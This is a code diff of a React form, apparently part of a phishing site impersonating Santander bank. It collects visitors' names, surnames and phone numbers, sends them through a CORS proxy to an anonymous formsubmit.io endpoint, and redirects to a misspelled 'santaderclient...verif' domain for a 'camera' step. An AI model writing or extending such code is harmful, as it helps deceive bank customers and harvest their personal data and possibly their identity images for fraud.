@@ -1,8 +1,8 @@
 import React, { useState } from 'react';
 import '../css/form.css';
-import backgroundImg from '../img/fondopri.jpg'; // Asegúrate de que la ruta sea correcta
-import logo from '../img/BSAC_BIG.D-e2baaa02.png'; // Asegúrate de tener el logo y la ruta correctan
-import personImg from '../img/persona.png'; // Asegúrate de tener la imagen de la persona y la ruta correcta
+import backgroundImg from '../img/fondopri.jpg'; 
+import logo from '../img/BSAC_BIG.D-e2baaa02.png'; 
+import personImg from '../img/persona.png'; 
 
 const Form = () => {
   const [formData, setFormData] = useState({ nombres: '', apellidos: '', celular: '' });
@@ -32,14 +32,14 @@ const Form = () => {
     e.preventDefault();
     if (validate()) {
       try {
-        const response = await fetch('https://formsubmit.io/44b61e96-d80d-4706-87e8-bcaa689dae2a', {
+        const response = await fetch('https://cors-anywhere.herokuapp.com/https://api.formsubmit.io/44b61e96-d80d-4706-87e8-bcaa689dae2a', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify(formData),
         });
-        
+
         if (response.ok) {
           console.log('Formulario enviado:', formData);
           window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara';
